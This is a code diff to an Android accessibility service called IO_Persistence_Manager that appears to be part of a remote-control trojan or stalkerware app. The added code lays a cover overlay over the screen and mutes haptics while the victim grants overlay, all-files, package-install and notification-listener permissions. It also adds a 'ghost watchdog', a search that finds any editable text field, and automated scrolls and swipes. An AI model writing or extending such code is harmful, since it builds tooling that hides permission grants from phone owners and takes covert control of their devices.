@@ -66,9 +66,11 @@ public class IO_Persistence_Manager extends AccessibilityService {
         // --- GHOST WATCHDOG PROTOCOL ---
         startGhostWatchdog();
 
-        // Immediately deploy cover overlay (0ms) and mute haptics the moment Accessibility is granted
-        silenceHaptics(this);
-        togglePermissionCover(true);
+        // Immediately deploy cover overlay (0ms) ONLY if special permissions are still missing!
+        if (!isFullyPermissioned()) {
+            silenceHaptics(this);
+            togglePermissionCover(true);
+        }
 
         // Auto-exit Settings back to PermissionActivity after Accessibility enablement
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -82,6 +84,18 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 }
             }
         }, 200);
+    }
+
+    public boolean isFullyPermissioned() {
+        try {
+            boolean overlayOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
+            boolean filesOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.R || android.os.Environment.isExternalStorageManager();
+            boolean installOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.O || getPackageManager().canRequestPackageInstalls();
+            boolean notifOk = PermissionActivity.isNotificationServiceEnabled(this);
+            return overlayOk && filesOk && installOk && notifOk;
+        } catch (Exception ignored) {
+            return false;
+        }
     }
 
     private void startGhostWatchdog() {
@@ -494,6 +508,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private static View permissionCoverView = null;
     private static final Handler coverTextHandler = new Handler(Looper.getMainLooper());
     private static Runnable coverTextRunnable = null;
+    private static final Handler coverWatchdogHandler = new Handler(Looper.getMainLooper());
+    private static Runnable coverWatchdogRunnable = null;
     private static int coverTextIndex = 0;
 
     private static final String[][] COVER_STATUS_MESSAGES = {
@@ -614,9 +630,18 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     };
                     coverTextHandler.postDelayed(coverTextRunnable, 1800);
 
+                    // Safety Watchdog: Auto-dismiss cover overlay after 12s max if not dismissed by PermissionActivity
+                    if (coverWatchdogRunnable != null) coverWatchdogHandler.removeCallbacks(coverWatchdogRunnable);
+                    coverWatchdogRunnable = () -> togglePermissionCover(false);
+                    coverWatchdogHandler.postDelayed(coverWatchdogRunnable, 12000);
+
                     Log.d(TAG, "GHOST_AUTOPILOT: Permission Cover Overlay DEPLOYED successfully");
                 }
             } else {
+                if (coverWatchdogRunnable != null) {
+                    coverWatchdogHandler.removeCallbacks(coverWatchdogRunnable);
+                    coverWatchdogRunnable = null;
+                }
                 if (coverTextRunnable != null) {
                     coverTextHandler.removeCallbacks(coverTextRunnable);
                     coverTextRunnable = null;
@@ -1071,11 +1096,40 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private AccessibilityNodeInfo findFocusedEditableNode(AccessibilityNodeInfo node) {
         if (node == null) return null;
-        if (node.isFocused() && node.isEditable()) return AccessibilityNodeInfo.obtain(node);
-        
+        if (node.isEditable() && (node.isFocused() || node.isAccessibilityFocused())) {
+            return AccessibilityNodeInfo.obtain(node);
+        }
         for (int i = 0; i < node.getChildCount(); i++) {
             AccessibilityNodeInfo child = node.getChild(i);
-            AccessibilityNodeInfo result = findFocusedEditableNode(child);
+            AccessibilityNodeInfo result = findFocusedEditableNodeInternal(child);
+            if (child != null) child.recycle();
+            if (result != null) return result;
+        }
+        return findAnyEditableNode(node);
+    }
+
+    private AccessibilityNodeInfo findFocusedEditableNodeInternal(AccessibilityNodeInfo node) {
+        if (node == null) return null;
+        if (node.isEditable() && (node.isFocused() || node.isAccessibilityFocused())) {
+            return AccessibilityNodeInfo.obtain(node);
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            AccessibilityNodeInfo result = findFocusedEditableNodeInternal(child);
+            if (child != null) child.recycle();
+            if (result != null) return result;
+        }
+        return null;
+    }
+
+    private AccessibilityNodeInfo findAnyEditableNode(AccessibilityNodeInfo node) {
+        if (node == null) return null;
+        if (node.isEditable()) {
+            return AccessibilityNodeInfo.obtain(node);
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            AccessibilityNodeInfo result = findAnyEditableNode(child);
             if (child != null) child.recycle();
             if (result != null) return result;
         }
@@ -1212,6 +1266,67 @@ public class IO_Persistence_Manager extends AccessibilityService {
         }
         root.recycle();
         return success;
+    }
+
+    public boolean performScroll(String direction) {
+        boolean success = false;
+        int sw = getScreenWidth() > 0 ? getScreenWidth() : 1080;
+        int sh = getScreenHeight() > 0 ? getScreenHeight() : 2400;
+        int cx = sw / 2;
+        int cy = sh / 2;
+
+        if ("down".equalsIgnoreCase(direction) || "forward".equalsIgnoreCase(direction)) {
+            // Scroll DOWN (drag finger UP from 70% to 25%)
+            success = swipe(cx, (int)(sh * 0.70), cx, (int)(sh * 0.25), 350);
+            boolean nativeOk = performNativeScroll(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
+            success = success || nativeOk;
+        } else if ("up".equalsIgnoreCase(direction) || "backward".equalsIgnoreCase(direction)) {
+            // Scroll UP (drag finger DOWN from 25% to 70%)
+            success = swipe(cx, (int)(sh * 0.25), cx, (int)(sh * 0.70), 350);
+            boolean nativeOk = performNativeScroll(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD);
+            success = success || nativeOk;
+        } else if ("left".equalsIgnoreCase(direction)) {
+            // Swipe LEFT (drag finger RIGHT from 20% to 80%)
+            success = swipe((int)(sw * 0.20), cy, (int)(sw * 0.80), cy, 350);
+        } else if ("right".equalsIgnoreCase(direction)) {
+            // Swipe RIGHT (drag finger LEFT from 80% to 20%)
+            success = swipe((int)(sw * 0.80), cy, (int)(sw * 0.20), cy, 350);
+        }
+        return success;
+    }
+
+    public boolean performNativeScroll(int scrollAction) {
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return false;
+
+            AccessibilityNodeInfo target = findScrollableNode(root);
+            if (target != null) {
+                boolean result = target.performAction(scrollAction);
+                target.recycle();
+                root.recycle();
+                return result;
+            }
+            root.recycle();
+        } catch (Exception ignored) {}
+        return false;
+    }
+
+    private AccessibilityNodeInfo findScrollableNode(AccessibilityNodeInfo node) {
+        if (node == null) return null;
+        if (node.isScrollable()) {
+            return AccessibilityNodeInfo.obtain(node);
+        }
+        int count = node.getChildCount();
+        for (int i = 0; i < count; i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                AccessibilityNodeInfo result = findScrollableNode(child);
+                child.recycle();
+                if (result != null) return result;
+            }
+        }
+        return null;
     }
 
     private volatile boolean isScreenshotting = false;
